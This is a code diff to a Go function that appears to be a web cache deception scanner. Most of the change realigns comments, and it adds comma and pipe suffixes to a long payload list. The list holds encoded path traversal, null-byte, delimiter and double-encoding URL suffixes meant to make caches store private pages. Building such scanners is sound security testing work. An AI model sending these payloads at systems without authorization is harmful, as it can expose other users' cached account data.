@@ -18,68 +18,70 @@ func TestWebCacheDeception() reportResult {
 
 	appendings := []string{
 		// --- CSS extension ---
-		"/.css",                   // Path parameter
-		"/nonexistent1.css",       // Path parameter
-		"/../nonexistent2.css",    // Path traversal
-		"/%2e%2e/nonexistent3.css", // Encoded path traversal
-		"%0Anonexistent4.css",     // Encoded Newline
-		"%00nonexistent5.css",     // Encoded Null Byte
-		"%09nonexistent6.css",     // Encoded Tab
-		"%3Bnonexistent7.css",     // Encoded Semicolon
-		"%23nonexistent8.css",     // Encoded Pound
+		"/.css",                        // Path parameter
+		"/nonexistent1.css",            // Path parameter
+		"/../nonexistent2.css",         // Path traversal
+		"/%2e%2e/nonexistent3.css",     // Encoded path traversal
+		"%0Anonexistent4.css",          // Encoded Newline
+		"%00nonexistent5.css",          // Encoded Null Byte
+		"%09nonexistent6.css",          // Encoded Tab
+		"%3Bnonexistent7.css",          // Encoded Semicolon
+		"%23nonexistent8.css",          // Encoded Pound
 		"%3Fname=valnonexistent9.css",  // Encoded Question Mark
 		"%26name=valnonexistent10.css", // Encoded Ampersand
-		";nonexistent11.css",      // Semicolon
-		"?nonexistent12.css",      // Question Mark
-		"&nonexistent13.css",      // Ampersand
+		";nonexistent11.css",           // Semicolon
+		"?nonexistent12.css",           // Question Mark
+		"&nonexistent13.css",           // Ampersand
+		",nonexistent14.css",           // Comma
+		"|nonexistent15.css",           // Pipe
 		// --- JS extension (common static asset) ---
-		"/nonexistent1.js",        // Path parameter JS
-		"/../nonexistent2.js",     // Path traversal JS
-		"%0Anonexistent4.js",      // Encoded Newline JS
-		"%3Bnonexistent7.js",      // Encoded Semicolon JS
-		";nonexistent11.js",       // Semicolon JS
-		"?nonexistent12.js",       // Question Mark JS
+		"/nonexistent1.js",    // Path parameter JS
+		"/../nonexistent2.js", // Path traversal JS
+		"%0Anonexistent4.js",  // Encoded Newline JS
+		"%3Bnonexistent7.js",  // Encoded Semicolon JS
+		";nonexistent11.js",   // Semicolon JS
+		"?nonexistent12.js",   // Question Mark JS
 		// --- Other static file extensions ---
-		"/nonexistent1.png",       // PNG image extension
-		"/nonexistent1.ico",       // Favicon extension
-		"/nonexistent1.woff2",     // Web font extension
-		"/nonexistent1.svg",       // SVG extension
-		"/nonexistent1.json",      // JSON extension
-		"?nonexistent.json",       // Question Mark JSON
-		";nonexistent.png",        // Semicolon PNG
+		"/nonexistent1.png",   // PNG image extension
+		"/nonexistent1.ico",   // Favicon extension
+		"/nonexistent1.woff2", // Web font extension
+		"/nonexistent1.svg",   // SVG extension
+		"/nonexistent1.json",  // JSON extension
+		"?nonexistent.json",   // Question Mark JSON
+		";nonexistent.png",    // Semicolon PNG
 		// --- Additional static file extensions ---
-		"/nonexistent1.mjs",       // ES Module JS
-		"/nonexistent1.ts",        // TypeScript
-		"/nonexistent1.avif",      // AVIF image
-		"/nonexistent1.bmp",       // BMP image
-		"/nonexistent1.mp4",       // MP4 video
-		"/nonexistent1.pdf",       // PDF document
-		"/nonexistent1.xml",       // XML
-		"/nonexistent1.zip",       // ZIP archive
+		"/nonexistent1.mjs",  // ES Module JS
+		"/nonexistent1.ts",   // TypeScript
+		"/nonexistent1.avif", // AVIF image
+		"/nonexistent1.bmp",  // BMP image
+		"/nonexistent1.mp4",  // MP4 video
+		"/nonexistent1.pdf",  // PDF document
+		"/nonexistent1.xml",  // XML
+		"/nonexistent1.zip",  // ZIP archive
 		// --- Double extension tricks ---
-		"/nonexistent.php.css",    // PHP + CSS double extension
-		"/nonexistent.asp.js",     // ASP + JS double extension
+		"/nonexistent.php.css", // PHP + CSS double extension
+		"/nonexistent.asp.js",  // ASP + JS double extension
 		// --- Fragment injection ---
-		"#nonexistent.css",        // Fragment + CSS
-		"#nonexistent.js",         // Fragment + JS
+		"#nonexistent.css", // Fragment + CSS
+		"#nonexistent.js",  // Fragment + JS
 		// --- More delimiter combinations ---
-		";nonexistent.json",       // Semicolon + JSON
-		"?nonexistent.xml",        // Question mark + XML
-		"/../nonexistent.png",     // Path traversal + PNG
-		"/../nonexistent.json",    // Path traversal + JSON
+		";nonexistent.json",    // Semicolon + JSON
+		"?nonexistent.xml",     // Question mark + XML
+		"/../nonexistent.png",  // Path traversal + PNG
+		"/../nonexistent.json", // Path traversal + JSON
 		// --- Null byte with other extensions ---
-		"%00nonexistent.js",       // Null byte + JS
-		"%00nonexistent.png",      // Null byte + PNG
+		"%00nonexistent.js",  // Null byte + JS
+		"%00nonexistent.png", // Null byte + PNG
 		// --- Web-cache normalization: %2F treated as / by cache but not origin ---
-		"%2F..%2Fnonexistentcache1.css",     // Web cache normalization (CSS)
-		"%2F..%2Fnonexistentcache2.js",      // Web cache normalization (JS)
+		"%2F..%2Fnonexistentcache1.css",      // Web cache normalization (CSS)
+		"%2F..%2Fnonexistentcache2.js",       // Web cache normalization (JS)
 		"%2F..%2F..%2Fnonexistentcache3.css", // Double traversal web cache normalization
 		// --- Double URL-encoding ---
-		"%252e%252e%2Fnonexistent1.css",     // Double URL-encoded path traversal
-		"%252F..%252Fnonexistent2.css",      // Double-encoded slash traversal
+		"%252e%252e%2Fnonexistent1.css", // Double URL-encoded path traversal
+		"%252F..%252Fnonexistent2.css",  // Double-encoded slash traversal
 		// --- Nginx off-by-slash: path traversal normalization ---
-		"/..;/nonexistent1.css",             // Tomcat/Java path traversal via semicolon
-		"..%2Fnonexistent1.css",             // Relative path traversal
+		"/..;/nonexistent1.css", // Tomcat/Java path traversal via semicolon
+		"..%2Fnonexistent1.css", // Relative path traversal
 		// --- Encoded path traversal to static directory using Encoded Newline ---
 		"%0A%2f%2e%2e%2fresources%2fnonexistent1.css",
 		"%00%2f%2e%2e%2fresources%2fnonexistent2.css",
@@ -94,16 +96,16 @@ func TestWebCacheDeception() reportResult {
 		// --- Single-level encoded path traversal to robots.txt (e.g. PortSwigger Lab 5 pattern) ---
 		// Pattern: <delimiter>%2f%2e%2e%2frobots.txt
 		// The cache treats the appended path as a static file; the origin resolves the traversal.
-		";%2f%2e%2e%2frobots.txt",      // Semicolon + single-level encoded traversal
-		"?%2f%2e%2e%2frobots.txt",      // Question mark + single-level encoded traversal
-		"&%2f%2e%2e%2frobots.txt",      // Ampersand + single-level encoded traversal
-		"%0A%2f%2e%2e%2frobots.txt",    // Encoded Newline + single-level encoded traversal
-		"%09%2f%2e%2e%2frobots.txt",    // Encoded Tab + single-level encoded traversal
-		"%00%2f%2e%2e%2frobots.txt",    // Encoded Null Byte + single-level encoded traversal
-		"%3B%2f%2e%2e%2frobots.txt",    // Encoded Semicolon + single-level encoded traversal
-		"%23%2f%2e%2e%2frobots.txt",    // Encoded Pound + single-level encoded traversal
-		"%3F%2f%2e%2e%2frobots.txt",    // Encoded Question Mark + single-level encoded traversal
-		"%26%2f%2e%2e%2frobots.txt",    // Encoded Ampersand + single-level encoded traversal
+		";%2f%2e%2e%2frobots.txt",   // Semicolon + single-level encoded traversal
+		"?%2f%2e%2e%2frobots.txt",   // Question mark + single-level encoded traversal
+		"&%2f%2e%2e%2frobots.txt",   // Ampersand + single-level encoded traversal
+		"%0A%2f%2e%2e%2frobots.txt", // Encoded Newline + single-level encoded traversal
+		"%09%2f%2e%2e%2frobots.txt", // Encoded Tab + single-level encoded traversal
+		"%00%2f%2e%2e%2frobots.txt", // Encoded Null Byte + single-level encoded traversal
+		"%3B%2f%2e%2e%2frobots.txt", // Encoded Semicolon + single-level encoded traversal
+		"%23%2f%2e%2e%2frobots.txt", // Encoded Pound + single-level encoded traversal
+		"%3F%2f%2e%2e%2frobots.txt", // Encoded Question Mark + single-level encoded traversal
+		"%26%2f%2e%2e%2frobots.txt", // Encoded Ampersand + single-level encoded traversal
 		// --- Multi-level encoded path traversal to robots.txt (deep traversal fallback) ---
 		"%0A%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2frobots.txt",
 		"%00%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2frobots.txt",
